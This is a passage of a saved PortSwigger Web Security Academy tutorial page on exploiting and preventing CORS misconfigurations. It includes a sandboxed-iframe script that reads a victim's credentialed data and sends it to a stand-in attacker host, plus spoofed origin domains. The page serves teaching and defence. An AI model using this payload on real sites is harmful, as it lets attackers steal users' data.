+            <span class="lab-level-display__apprentice"><nr-sentence class="nr-s40" id="nr-s40" page="0">APPRENTICE</nr-sentence></span>
+            <a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack"><nr-sentence class="nr-s40" id="nr-s40" page="0">CORS vulnerability with basic origin reflection</nr-sentence></a>
+        </div>
+    </div>
+
+		<h3 id="errors-parsing-origin-headers"><nr-sentence class="nr-s41" id="nr-s41" page="0">Errors parsing Origin headers</nr-sentence></h3>
+		<p><nr-sentence class="nr-s42" id="nr-s42" page="0">
+			Some applications that support access from multiple origins do so by using a whitelist of allowed origins.</nr-sentence><nr-sentence class="nr-s43" id="nr-s43" page="0"> When a CORS request is received, the supplied origin is compared to the whitelist.</nr-sentence><nr-sentence class="nr-s44" id="nr-s44" page="0"> If the origin appears on the whitelist then it is reflected in the </nr-sentence><code><nr-sentence class="nr-s44" id="nr-s44" page="0">Access-Control-Allow-Origin</nr-sentence></code><nr-sentence class="nr-s44" id="nr-s44" page="0"> header so that access is granted.</nr-sentence><nr-sentence class="nr-s45" id="nr-s45" page="0"> For example, the application receives a normal request like:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s46" id="nr-s46" page="0">GET /data HTTP/1.1
+Host: normal-website.com
+...
+Origin: https://innocent-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s47" id="nr-s47" page="0">
+			The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s48" id="nr-s48" page="0">HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://innocent-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s49" id="nr-s49" page="0">
+			Mistakes often arise when implementing CORS origin whitelists.</nr-sentence><nr-sentence class="nr-s50" id="nr-s50" page="0"> Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).</nr-sentence><nr-sentence class="nr-s51" id="nr-s51" page="0"> And some applications allow access from various other organizations' domains including their subdomains.</nr-sentence><nr-sentence class="nr-s52" id="nr-s52" page="0"> These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions.</nr-sentence><nr-sentence class="nr-s53" id="nr-s53" page="0"> Any mistakes in the implementation can lead to access being granted to unintended external domains.</nr-sentence>
+		</p>
+		<p><nr-sentence class="nr-s54" id="nr-s54" page="0">
+			For example, suppose an application grants access to all domains ending in:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s55" id="nr-s55" page="0">normal-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s56" id="nr-s56" page="0">
+			An attacker might be able to gain access by registering the domain:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s57" id="nr-s57" page="0">hackersnormal-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s58" id="nr-s58" page="0">
+			Alternatively, suppose an application grants access to all domains beginning with</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s59" id="nr-s59" page="0">normal-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s60" id="nr-s60" page="0">
+			An attacker might be able to gain access using the domain:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s61" id="nr-s61" page="0">normal-website.com.evil-user.net</nr-sentence></code>
+		<h3 id="whitelisted-null-origin-value"><nr-sentence class="nr-s62" id="nr-s62" page="0">Whitelisted null origin value</nr-sentence></h3>
+		<p><nr-sentence class="nr-s63" id="nr-s63" page="0">
+			The specification for the Origin header supports the value </nr-sentence><code><nr-sentence class="nr-s63" id="nr-s63" page="0">null</nr-sentence></code><nr-sentence class="nr-s63" id="nr-s63" page="0">.</nr-sentence><nr-sentence class="nr-s64" id="nr-s64" page="0"> Browsers might send the value </nr-sentence><code><nr-sentence class="nr-s64" id="nr-s64" page="0">null</nr-sentence></code><nr-sentence class="nr-s64" id="nr-s64" page="0"> in the Origin header in various unusual situations:</nr-sentence>
+		</p>
+		<ul>
+		    <li><nr-sentence class="nr-s65" id="nr-s65" page="0">
+				Cross-origin redirects.</nr-sentence>
+			</li>
+		    <li><nr-sentence class="nr-s66" id="nr-s66" page="0">
+				Requests from serialized data.</nr-sentence>
+			</li>
+		    <li><nr-sentence class="nr-s67" id="nr-s67" page="0">
+				Request using the </nr-sentence><code><nr-sentence class="nr-s67" id="nr-s67" page="0">file:</nr-sentence></code><nr-sentence class="nr-s67" id="nr-s67" page="0"> protocol.</nr-sentence>
+			</li>
+		    <li><nr-sentence class="nr-s68" id="nr-s68" page="0">
+				Sandboxed cross-origin requests.</nr-sentence>
+			</li>
+		</ul>
+		<p><nr-sentence class="nr-s69" id="nr-s69" page="0">
+			Some applications might whitelist the </nr-sentence><code><nr-sentence class="nr-s69" id="nr-s69" page="0">null</nr-sentence></code><nr-sentence class="nr-s69" id="nr-s69" page="0"> origin to support local development of the application.</nr-sentence><nr-sentence class="nr-s70" id="nr-s70" page="0"> For example, suppose an application receives the following cross-origin request:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s71" id="nr-s71" page="0">GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null</nr-sentence></code>
+		<p><nr-sentence class="nr-s72" id="nr-s72" page="0">
+			And the server responds with:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s73" id="nr-s73" page="0">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true</nr-sentence></code>
+		<p><nr-sentence class="nr-s74" id="nr-s74" page="0">
+			In this situation, an attacker can use various tricks to generate a cross-origin request containing the value </nr-sentence><code><nr-sentence class="nr-s74" id="nr-s74" page="0">null</nr-sentence></code><nr-sentence class="nr-s74" id="nr-s74" page="0"> in the Origin header.</nr-sentence><nr-sentence class="nr-s75" id="nr-s75" page="0"> This will satisfy the whitelist, leading to cross-domain access.</nr-sentence><nr-sentence class="nr-s76" id="nr-s76" page="0"> For example, this can be done using a sandboxed </nr-sentence><code><nr-sentence class="nr-s76" id="nr-s76" page="0">iframe</nr-sentence></code><nr-sentence class="nr-s76" id="nr-s76" page="0"> cross-origin request of the form:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s77" id="nr-s77" page="0">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get',</nr-sentence><nr-sentence class="nr-s78" id="nr-s78" page="0">'vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='malicious-website.com/log?key='+this.responseText;
+};
+&lt;/script&gt;"&gt;&lt;/iframe&gt;</nr-sentence></code>
+		
+
+    <div class="widgetcontainer-lab-link " id="9d294029d336d1a8cefb9d84577fc92304467e91f4f9918e74b50be2c561db79">
+        <span><nr-sentence class="nr-s79" id="nr-s79" page="0">LAB</nr-sentence></span>
+        <div class="flex-columns">
+            <span class="lab-level-display__apprentice"><nr-sentence class="nr-s79" id="nr-s79" page="0">APPRENTICE</nr-sentence></span>
+            <a href="https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack"><nr-sentence class="nr-s79" id="nr-s79" page="0">CORS vulnerability with trusted null origin</nr-sentence></a>
+        </div>
+    </div>
+
+		<h3 id="exploiting-xss-via-cors-trust-relationships"><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting"><nr-sentence class="nr-s80" id="nr-s80" page="0">Exploiting XSS</nr-sentence></a><nr-sentence class="nr-s80" id="nr-s80" page="0"> via CORS trust relationships</nr-sentence>
+		</h3>
+		<p><nr-sentence class="nr-s81" id="nr-s81" page="0">
+			Even "correctly" configured CORS establishes a trust relationship between two origins.</nr-sentence><nr-sentence class="nr-s82" id="nr-s82" page="0"> If a website trusts an origin that is vulnerable to cross-site scripting (</nr-sentence><a href="https://portswigger.net/web-security/cross-site-scripting"><nr-sentence class="nr-s82" id="nr-s82" page="0">XSS</nr-sentence></a><nr-sentence class="nr-s82" id="nr-s82" page="0">), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.</nr-sentence>
+		</p>
+		<p><nr-sentence class="nr-s83" id="nr-s83" page="0">
+			Given the following request:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s84" id="nr-s84" page="0">GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://subdomain.vulnerable-website.com
+Cookie: sessionid=...</nr-sentence></code>
+		<p><nr-sentence class="nr-s85" id="nr-s85" page="0">
+			If the server responds with:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s86" id="nr-s86" page="0">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true</nr-sentence></code>
+		<p><nr-sentence class="nr-s87" id="nr-s87" page="0">
+			Then an attacker who finds an XSS vulnerability on </nr-sentence><code><nr-sentence class="nr-s87" id="nr-s87" page="0">subdomain.vulnerable-website.com</nr-sentence></code><nr-sentence class="nr-s87" id="nr-s87" page="0"> could use that to retrieve the API key, using a URL like:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s88" id="nr-s88" page="0">https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;</nr-sentence></code>
+		<h3 id="breaking-tls-with-poorly-configured-cors"><nr-sentence class="nr-s89" id="nr-s89" page="0">Breaking TLS with poorly configured CORS</nr-sentence>
+		</h3>
+		<p><nr-sentence class="nr-s90" id="nr-s90" page="0">
+			Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.</nr-sentence><nr-sentence class="nr-s91" id="nr-s91" page="0"> For example, when the application receives the following request:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s92" id="nr-s92" page="0">GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: http://trusted-subdomain.vulnerable-website.com
+Cookie: sessionid=...</nr-sentence></code>
+		<p><nr-sentence class="nr-s93" id="nr-s93" page="0">
+			The application responds with:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s94" id="nr-s94" page="0">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true</nr-sentence></code>
+		<p><nr-sentence class="nr-s95" id="nr-s95" page="0">
+			In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application.</nr-sentence><nr-sentence class="nr-s96" id="nr-s96" page="0"> This attack involves the following steps:</nr-sentence>
+		</p>
+		<ul>
+			<li><nr-sentence class="nr-s97" id="nr-s97" page="0">
+				The victim user makes any plain HTTP request.</nr-sentence>
+			</li>
+			<li>
+				<p><nr-sentence class="nr-s98" id="nr-s98" page="0">
+					The attacker injects a redirection to:</nr-sentence>
+				</p>
+				<code class="code-scrollable"><nr-sentence class="nr-s99" id="nr-s99" page="0">http://trusted-subdomain.vulnerable-website.com</nr-sentence></code>
+			</li>
+			<li><nr-sentence class="nr-s100" id="nr-s100" page="0">
+				The victim's browser follows the redirect.</nr-sentence>
+			</li>
+			<li>
+				<p><nr-sentence class="nr-s101" id="nr-s101" page="0">
+					The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:</nr-sentence>
+				</p>
+				<code class="code-scrollable"><nr-sentence class="nr-s102" id="nr-s102" page="0">https://vulnerable-website.com</nr-sentence></code>
+			</li>
+			<li>
+				<p><nr-sentence class="nr-s103" id="nr-s103" page="0">
+					The victim's browser makes the CORS request, including the origin:</nr-sentence>
+				</p>
+				<code class="code-scrollable"><nr-sentence class="nr-s104" id="nr-s104" page="0">http://trusted-subdomain.vulnerable-website.com</nr-sentence></code>
+			</li>
+			<li><nr-sentence class="nr-s105" id="nr-s105" page="0">
+				The application allows the request because this is a </nr-sentence><span><nr-sentence class="nr-s105" id="nr-s105" page="0">whitelisted</nr-sentence></span><nr-sentence class="nr-s105" id="nr-s105" page="0"> origin.</nr-sentence><nr-sentence class="nr-s106" id="nr-s106" page="0"> The requested sensitive data is returned in the response.</nr-sentence>
+			</li>
+			<li><nr-sentence class="nr-s107" id="nr-s107" page="0">
+				The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.</nr-sentence>
+			</li>
+		</ul>
+		<p><nr-sentence class="nr-s108" id="nr-s108" page="0">
+			This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.</nr-sentence>
+		</p>
+		
+
+    <div class="widgetcontainer-lab-link " id="c2f3d400e6fb00bebe61e8dca6a98b25a66613b18da83b2279298634c46d7f8e">
+        <span><nr-sentence class="nr-s109" id="nr-s109" page="0">LAB</nr-sentence></span>
+        <div class="flex-columns">
+            <span class="lab-level-display__practitioner"><nr-sentence class="nr-s109" id="nr-s109" page="0">PRACTITIONER</nr-sentence></span>
+            <a href="https://portswigger.net/web-security/cors/lab-breaking-https-attack"><nr-sentence class="nr-s109" id="nr-s109" page="0">CORS vulnerability with trusted insecure protocols</nr-sentence></a>
+        </div>
+    </div>
+
+		 <div class="component-links">
+            <h4><nr-sentence class="nr-s110" id="nr-s110" page="0">Read more</nr-sentence></h4>
+            <a href="https://portswigger.net/web-security/cross-site-scripting"><nr-sentence class="nr-s110" id="nr-s110" page="0">Cross-site scripting</nr-sentence></a>
+        </div>
+		<h3 id="intranets-and-cors-without-credentials"><nr-sentence class="nr-s111" id="nr-s111" page="0">Intranets and CORS without credentials</nr-sentence>
+		</h3>
+		<p><nr-sentence class="nr-s112" id="nr-s112" page="0">
+			Most CORS attacks rely on the presence of the response header:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s113" id="nr-s113" page="0">Access-Control-Allow-Credentials: true</nr-sentence></code>
+		<p><nr-sentence class="nr-s114" id="nr-s114" page="0">
+			Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.</nr-sentence>
+		</p>
+		<p><nr-sentence class="nr-s115" id="nr-s115" page="0">
+			However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space.</nr-sentence><nr-sentence class="nr-s116" id="nr-s116" page="0"> Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.</nr-sentence><nr-sentence class="nr-s117" id="nr-s117" page="0"> For example, a cross-origin request within a private network may be as follows:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s118" id="nr-s118" page="0">GET /reader?url=doc1.pdf
+Host: intranet.normal-website.com
+Origin: https://normal-website.com</nr-sentence></code>
+		<p><nr-sentence class="nr-s119" id="nr-s119" page="0">
+			And the server responds with:</nr-sentence>
+		</p>
+		<code class="code-scrollable"><nr-sentence class="nr-s120" id="nr-s120" page="0">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *</nr-sentence></code>
+		<p><nr-sentence class="nr-s121" id="nr-s121" page="0">
+			The application server is trusting resource requests from any origin without credentials.</nr-sentence><nr-sentence class="nr-s122" id="nr-s122" page="0"> If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.</nr-sentence>
+		</p>
+		
+
+    <div class="widgetcontainer-lab-link " id="ce76d9b77347564949ed91ce42ea3e0c2826ff79a4f5d017d0bfff57d1a7b9b3">
+        <span><nr-sentence class="nr-s123" id="nr-s123" page="0">LAB</nr-sentence></span>
+        <div class="flex-columns">
+            <span class="lab-level-display__expert"><nr-sentence class="nr-s123" id="nr-s123" page="0">EXPERT</nr-sentence></span>
+            <a href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack"><nr-sentence class="nr-s123" id="nr-s123" page="0">CORS vulnerability with internal network pivot attack</nr-sentence></a>
+        </div>
+    </div>
+
+		<h2 id="how-to-prevent-cors-based-attacks"><nr-sentence class="nr-s124" id="nr-s124" page="0">How to prevent CORS-based attacks</nr-sentence></h2>
+		<p><nr-sentence class="nr-s125" id="nr-s125" page="0">
+			CORS vulnerabilities arise primarily as misconfigurations.</nr-sentence><nr-sentence class="nr-s126" id="nr-s126" page="0"> Prevention is therefore a configuration problem.</nr-sentence><nr-sentence class="nr-s127" id="nr-s127" page="0"> The following sections describe some effective defenses against CORS attacks.</nr-sentence>
+		</p>
+		<h3 id="proper-configuration-of-cross-origin-requests"><nr-sentence class="nr-s128" id="nr-s128" page="0">Proper configuration of cross-origin requests</nr-sentence>
+		</h3>
+		<p><nr-sentence class="nr-s129" id="nr-s129" page="0">
+		    If a web resource contains sensitive information, the origin should be properly specified in the </nr-sentence><code><nr-sentence class="nr-s129" id="nr-s129" page="0">Access-Control-Allow-Origin</nr-sentence></code><nr-sentence class="nr-s129" id="nr-s129" page="0"> header.</nr-sentence>
+	    </p>
+		<h3 id="only-allow-trusted-sites"><nr-sentence class="nr-s130" id="nr-s130" page="0">Only allow trusted sites</nr-sentence>
+		</h3>
+		<p><nr-sentence class="nr-s131" id="nr-s131" page="0">
+		    It may seem obvious but origins specified in the </nr-sentence><code><nr-sentence class="nr-s131" id="nr-s131" page="0">Access-Control-Allow-Origin</nr-sentence></code><nr-sentence class="nr-s131" id="nr-s131" page="0"> header should only be sites that are trusted.</nr-sentence><nr-sentence class="nr-s132" id="nr-s132" page="0"> In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.</nr-sentence>
+	    </p>
+		<h3 id="avoid-whitelisting-null"><nr-sentence class="nr-s133" id="nr-s133" page="0">Avoid whitelisting null</nr-sentence></h3>
+		<p><nr-sentence class="nr-s134" id="nr-s134" page="0">
+		    Avoid using the header </nr-sentence><code><nr-sentence class="nr-s134" id="nr-s134" page="0">Access-Control-Allow-Origin: null</nr-sentence></code><nr-sentence class="nr-s134" id="nr-s134" page="0">.</nr-sentence><nr-sentence class="nr-s135" id="nr-s135" page="0"> Cross-origin resource calls from internal documents and sandboxed requests can specify the </nr-sentence><code><nr-sentence class="nr-s135" id="nr-s135" page="0">null</nr-sentence></code><nr-sentence class="nr-s135" id="nr-s135" page="0"> origin.</nr-sentence><nr-sentence class="nr-s136" id="nr-s136" page="0"> CORS headers should be properly defined in respect of trusted origins for private and public servers.</nr-sentence>
+	    </p>
+		<h3 id="avoid-wildcards-in-internal-networks"><nr-sentence class="nr-s137" id="nr-s137" page="0">Avoid wildcards in internal networks</nr-sentence></h3>
+		<p><nr-sentence class="nr-s138" id="nr-s138" page="0">
+			Avoid using wildcards in internal networks.</nr-sentence><nr-sentence class="nr-s139" id="nr-s139" page="0"> Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.</nr-sentence>
+		</p>
+		<h3 id="cors-is-not-a-substitute-for-server-side-security-policies"><nr-sentence class="nr-s140" id="nr-s140" page="0">CORS is not a substitute for server-side security policies</nr-sentence></h3>
+		<p><nr-sentence class="nr-s141" id="nr-s141" page="0">
+			CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin.</nr-sentence><nr-sentence class="nr-s142" id="nr-s142" page="0"> Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.</nr-sentence>
+		</p>
+		        <div class="component-links">
+            <h4><nr-sentence class="nr-s143" id="nr-s143" page="0">Read more</nr-sentence></h4>
+            <a href="https://portswigger.net/burp/vulnerability-scanner"><nr-sentence class="nr-s143" id="nr-s143" page="0">Find CORS vulnerabilities using Burp Suite's web vulnerability scanner</nr-sentence></a>
+        </div>
+
+
+                    </div>
+                    <div class="rightcol rightcol-boxes">
+                        
+	    
+<input class="hidden" id="trackerpopup" type="checkbox">
+<div class="widgetcontainer-box is-twobtns academy-account-status pin-to-bottom" id="AcademyAccountStatusWidget">
+        <p class="hidden-when-collapsed">Want to track your progress and have a more personalized learning experience? (It's free!)</p>
+        <div class="flex-center">
+            <a class="btn" href="https://portswigger.net/users/register">Sign up</a>
+            <a class="btn" href="https://portswigger.net/users?returnurl=%2fweb-security%2fcors">Login</a>
+        </div>
+</div>
+
+
+        
+
+        <div class="widgetcontainer-box is-linklist">
+            <h4>In this topic</h4>
+            <a href="https://portswigger.net/web-security/cors">CORS</a>
+            <a href="https://portswigger.net/web-security/cors/same-origin-policy">Same-origin policy</a>
+            <a href="https://portswigger.net/web-security/cors/access-control-allow-origin">Access-control-allow-origin</a>
+        </div>
+        <div class="widgetcontainer-box is-linklist">
+            <h4>All topics</h4>
+            <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a>
+            <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a>
+            <a href="https://portswigger.net/web-security/csrf">CSRF</a>
+            <a href="https://portswigger.net/web-security/clickjacking">Clickjacking</a>
+            <a href="https://portswigger.net/web-security/dom-based">DOM-based</a>
+            <a href="https://portswigger.net/web-security/cors">CORS</a>
+            <a href="https://portswigger.net/web-security/xxe">XXE</a>
+            <a href="https://portswigger.net/web-security/ssrf">SSRF</a>
+            <a href="https://portswigger.net/web-security/request-smuggling">Request smuggling</a>
+            <a href="https://portswigger.net/web-security/os-command-injection">Command injection</a>
+            <a href="https://portswigger.net/web-security/server-side-template-injection">Server-side template injection</a>
+            <a href="https://portswigger.net/web-security/deserialization">Insecure deserialization</a>
+            <a href="https://portswigger.net/web-security/file-path-traversal">Directory traversal</a>
+            <a href="https://portswigger.net/web-security/access-control">Access control</a>
+            <a href="https://portswigger.net/web-security/authentication">Authentication</a>
+            <a href="https://portswigger.net/web-security/oauth">OAuth authentication</a>
+            <a href="https://portswigger.net/web-security/logic-flaws">Business logic vulnerabilities</a>
+            <a href="https://portswigger.net/web-security/web-cache-poisoning">Web cache poisoning</a>
+            <a href="https://portswigger.net/web-security/host-header">HTTP Host header attacks</a>
+            <a href="https://portswigger.net/web-security/websockets">WebSockets</a>
+            <a href="https://portswigger.net/web-security/information-disclosure">Information disclosure</a>
+            <a href="https://portswigger.net/web-security/file-upload">File upload vulnerabilities</a>
+            <a href="https://portswigger.net/web-security/jwt">JWT attacks</a>
+            <a href="https://portswigger.net/web-security/essential-skills">Essential skills</a>
+            <a href="https://portswigger.net/web-security/prototype-pollution">Client-side prototype pollution</a>
+        </div>
+        <div class="widget-orange">
+            <img alt="Try Burp Suite for Free" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/burp-suite-icon.svg">
+            <h4>Find CORS vulnerabilities using Burp Suite</h4>
+            <a class="button-white" href="https://portswigger.net/burp">Try for free</a>
+        </div>
+	
+                    </div>
+                </div>
+        </section>
+
+
+            <div class="section-full-width theme-community-6 text-center">
+                <h2>Register for free to track your learning progress</h2>
+                    <div class="container-columns-vertically-centered">
+                        <div class="text-right">
+                            <img alt="The benefits of working through PortSwigger&#39;s Web Security Academy" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/academy.png">
+                        </div>
+                        <div class="text-left">
+                            <ul class="unordered-list-vertical-ticks-small">
+                                <li><p>Practise exploiting vulnerabilities on realistic targets.</p></li>
+                            	<li><p>Record your progression from Apprentice to Expert.</p></li>
+                            	<li><p>See where you rank in our Hall of Fame.</p></li>
+                            </ul>
+                            
+<form action="https://portswigger.net/users/register" class="text-left" id="RegistrationWidget-59027A952ECA83C18FBF068DA3D3872F" method="post"><input type="hidden" name="RequestVerificationToken" value="088B2FDCFD31F64FB3BCACAAC3A6A9BC804E95241A4596E07DEE36CBDDBE0DAAB93C602CC89DD0CF0FDE5A8B0D02F11688A64154E11A76D2851E181CB3FB57D5">        <div class="form-small disable-no-recaptcha">
+            <div class="font-small-error hidden">
+                <span class="icon-alert-white"></span>
+                <span class="font-small-error-text"></span>
+            </div>
+            <label>
+                <input name="EmailAddress" placeholder="Enter your email" type="email">
+                <button class="button-orange" type="button">
+                    <span>REGISTER</span>
+                </button>
+            </label>
+        </div>
+    <div id="Recaptcha-59027A952ECA83C18FBF068DA3D3872F" class="recaptcha-div">
+            <div class="recaptcha-inner">
+                <div class="hidden" id="NoRecaptcha-59027A952ECA83C18FBF068DA3D3872F">
+                    
+
+    <div class="notify-inline no-padding-bottom  error">
+        <div class="notify-logo icon-error"></div>
+        <div class="notify-message">
+            As we use reCAPTCHA, you need to be able to access Google's servers to use this function.
+        </div>
+    </div>
+
+                </div>
+
+                <input id="RecaptchaToken-59027A952ECA83C18FBF068DA3D3872F" name="RecaptchaToken" type="hidden" value="">
+                <input type="hidden" id="RecaptchaClientSecret-59027A952ECA83C18FBF068DA3D3872F" value="6LfgVpcUAAAAAMLiC7gC5kn_9oQizGINumO8VgHm">
+                <input type="hidden" id="RecaptchaV2ClientSecret-59027A952ECA83C18FBF068DA3D3872F" value="6LeQHpwUAAAAAJ4LAI9AKvqARvxAiMo1EezetJ6V">
+                <div id="RecaptchaRenderLocation-59027A952ECA83C18FBF068DA3D3872F" class="grecaptcha-v2-box"></div>
+            </div>
+            <script nonce="">
+              var recaptchaClientUrl = "https://www.google.com/recaptcha/api.js?render=";
+            </script>
+        <span class="Warning field-validation-valid" data-valmsg-for="RecaptchaToken" data-valmsg-replace="true"></span>
+    </div>
+</form>    <p>
+        Already got an account?
+        <a href="https://portswigger.net/users">Login here</a>
+    </p>
+    <script src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/register.js.download" nonce=""></script>
+
+                        </div>
+                    </div>
+            </div>
+        
+
+    <script src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/staticcms.js.download" nonce=""></script>
+
+
+        
+    <footer class="wrapper">
+        <div class="container">
+            <div>
+                <p>Burp Suite</p>
+                <a href="https://portswigger.net/burp/vulnerability-scanner">Web vulnerability scanner</a>
+                <a href="https://portswigger.net/burp">Burp Suite Editions</a>
+                <a href="https://portswigger.net/burp/releases">Release Notes</a>
+            </div>
+            <div>
+                <p>Vulnerabilities</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+                <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a>
+                <a href="https://portswigger.net/web-security/csrf">Cross-site request forgery</a>
+                <a href="https://portswigger.net/web-security/xxe">XML external entity injection</a>
+                <a href="https://portswigger.net/web-security/file-path-traversal">Directory traversal</a>
+                <a href="https://portswigger.net/web-security/ssrf">Server-side request forgery</a>
+            </div>
+            <div>
+                <p>Customers</p>
+                <a href="https://portswigger.net/organizations">Organizations</a>
+                <a href="https://portswigger.net/testers">Testers</a>
+                <a href="https://portswigger.net/developers">Developers</a>
+            </div>
+            <div>
+                <p>Company</p>
+                <a href="https://portswigger.net/about">About</a>
+                <a href="https://portswigger.net/news">PortSwigger News</a>
+                <a href="https://portswigger.net/careers">Careers</a>
+                <a href="https://portswigger.net/about/contact">Contact</a>
+                <a href="https://portswigger.net/legal">Legal</a>
+                <a href="https://portswigger.net/privacy">Privacy Notice</a>
+            </div>
+            <div>
+                <p>Insights</p>
+                <a href="https://portswigger.net/web-security">Web Security Academy</a>
+                <a href="https://portswigger.net/blog">Blog</a>
+                <a href="https://portswigger.net/research">Research</a>
+                <a href="https://portswigger.net/daily-swig">The Daily Swig</a>
+            </div>
+            <div>
+                <a href="https://portswigger.net/"><img src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+                <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+                <p class="grey">© 2023 PortSwigger Ltd.</p>
+            </div>
+        </div>
+    </footer>
+    <a href="https://portswigger.net/web-security/cors#top" class="back-to-top allow-for-pinned"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63"></polygon><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path></svg></a>
+
+    
+<script id="RecaptchaScript" async="" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/api.js.download"></script><iframe id="nr-ext-rsicon" style="position: absolute; display: none; width: 50px; height: 50px; z-index: 2147483647; border-style: none; background: transparent;" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/saved_resource(1).html"></iframe><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/anchor.html" width="256" height="60" role="presentation" name="a-i2bdyo8hy6jo" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/saved_resource(2).html"></iframe></div><iframe id="nr-ext-cc" scrolling="no" 